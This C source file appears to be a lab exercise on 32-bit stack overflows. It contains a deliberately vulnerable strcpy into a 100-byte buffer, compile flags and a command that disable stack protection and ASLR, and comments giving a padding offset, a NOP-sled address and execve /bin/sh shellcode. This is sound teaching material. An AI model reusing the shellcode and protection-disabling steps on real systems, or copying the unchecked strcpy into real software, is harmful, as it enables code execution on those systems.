/*
Use the necessary tools to perform analysis of the compiled source code generated. Since we
are working in 32-bit use “-m32” for your gcc compilation options. For compilation I would
suggest using compiler option “-fno-stack-protector” and “-z execstack”. Please submit
write-ups of your analysis. Your points will be based on completeness of analysis, your
understanding of the problems, and if you were able to achieve the goals.

To compile:
gcc -m32 -fno-stack-protector -z execstack problem3.c -o problem3

Problem 3: 15 pts
Compile the below program; Cause a control flow deviation to a shell?

1:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

2:
ulimit -S -u unlimited
*/

#include <stdio.h>
#include <string.h>

void func(char *name){
    // cyclic used: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab
    // len of 112 to padd
    // target address in NOP sled: 0xffffd130:, \x30\xd1\xff\xff
    // \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
    char buf[100];

    strcpy(buf, name);
    printf("Welcome %s\n", buf);
}

int main(int argc, char *argv[]){
    func(argv[1]);
    return 0;
}
